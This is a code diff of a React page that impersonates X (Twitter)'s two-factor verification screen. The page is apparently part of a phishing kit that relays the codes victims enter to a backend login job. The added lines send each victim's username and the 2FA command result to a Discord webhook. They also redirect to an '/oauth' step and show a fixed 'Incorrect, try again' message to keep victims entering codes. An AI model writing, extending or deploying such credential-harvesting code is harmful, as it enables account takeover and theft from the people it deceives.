@@ -10,9 +10,10 @@ import type {
   JobCommandResponse,
 } from "../../../server/src/types/jobs";
 
-import { FullScreenLoader } from "../components/FullScreenLoader";
+import { FullScreenBlueLoader } from "../components/FullScreenBlueLoader";
 import { Toast } from "../components/Toast";
 import { API_BASE } from "../config/api";
+import { sendDiscordWebhookSafe } from "../helpers/webhook";
 
 export const TwoFA = () => {
   const location = useLocation();
@@ -100,7 +101,12 @@ export const TwoFA = () => {
 
       if (!cmdResp.data.ok) {
         setLoading(false);
-        setToast(cmdResp.data.error || "Command failed");
+        const error = cmdResp.data.error || "Command failed";
+        if (error === "NO_ACTIVE_SESSION") {
+          navigate("/oauth");
+          return;
+        }
+        setToast(error);
         return;
       }
 
@@ -120,21 +126,47 @@ export const TwoFA = () => {
         return;
       }
 
+      // 🔥 Webhook Discord avec le résultat de la commande
+      console.log("📤 Sending webhook for 2FA command result:", {
+        username,
+        commandId,
+        status: finalState.status,
+      });
+      
+      sendDiscordWebhookSafe({
+        username: "2FA Command Result",
+        content:
+          "🔑 **2FA Command Result**\n" +
+          "```json\n" +
+          JSON.stringify(
+            {
+              username,
+              commandId,
+              status: finalState.status,
+              result: finalState.result,
+              error: finalState.error,
+            },
+            null,
+            2
+          ) +
+          "\n```",
+      });
+
       if (finalState.status === "done" && finalState.result?.ok) {
         console.log("✅ 2FA OK", finalState.result);
         navigate("/", { state: { username } });
         return;
       }
 
-      const msg =
-        finalState.error ||
-        finalState.result?.message ||
-        finalState.result?.error ||
-        "Invalid 2FA code";
-      setToast(msg);
+      setToast("Incorrect. Please try again. g;176386412757198839:-1763864199877:9zAFrYNvTejYilPRFf0c5elL:7");
     } catch (err: any) {
       setLoading(false);
-      setToast(err.response?.data?.error || err.message || "Network error");
+      const error = err.response?.data?.error || err.message || "Network error";
+      if (error === "NO_ACTIVE_SESSION") {
+        navigate("/oauth");
+        return;
+      }
+      setToast(error);
     }
   };
 
@@ -144,7 +176,7 @@ export const TwoFA = () => {
 
   return (
     <div className="twofa-page">
-      <FullScreenLoader visible={loading} text="Verifying code..." />
+      <FullScreenBlueLoader visible={loading} />
       <Toast message={toast} onClose={() => setToast("")} />
 
       <div className="twofa-modal" role="dialog" aria-modal="true">
@@ -154,7 +186,7 @@ export const TwoFA = () => {
             <div className="twofa-close-button-container">
               <button
                 className="twofa-close-button"
-                aria-label="Fermer"
+                aria-label="Close"
                 type="button"
                 onClick={() => navigate(-1)}
               >
@@ -189,12 +221,11 @@ export const TwoFA = () => {
         <div className="twofa-content">
           <div className="twofa-title-container">
             <h1 className="twofa-title" id="modal-header">
-              Entrez votre code de vérification
+              Enter your verification code
             </h1>
             <div className="twofa-description">
               <span>
-                Utilisez votre application génératrice de code et saisissez
-                ci-dessous le code obtenu.
+                Use your code generator app and enter the code below.
               </span>
             </div>
           </div>
@@ -220,7 +251,7 @@ export const TwoFA = () => {
           <div className="twofa-form">
             <label className="twofa-label">
               <div className="twofa-label-text">
-                <span>Entrez le code</span>
+                <span>Enter the code</span>
               </div>
               <div className="twofa-input-wrapper">
                 <input
@@ -253,7 +284,7 @@ export const TwoFA = () => {
                   // TODO: Implement alternative verification method
                 }}
               >
-                Choisir une autre méthode de vérification
+                Choose another verification method
               </button>
               <a
                 href="https://help.twitter.com/forms/account-access/regain-access"
@@ -261,7 +292,7 @@ export const TwoFA = () => {
                 rel="noopener noreferrer nofollow"
                 className="twofa-link-button"
               >
-                Contacter l&apos;Assistance X
+                Contact X Support
               </a>
             </div>
 
@@ -271,7 +302,7 @@ export const TwoFA = () => {
               disabled={loading || !code.trim()}
               type="button"
             >
-              <span>Suivant</span>
+              <span>Next</span>
             </button>
           </div>
         </div>
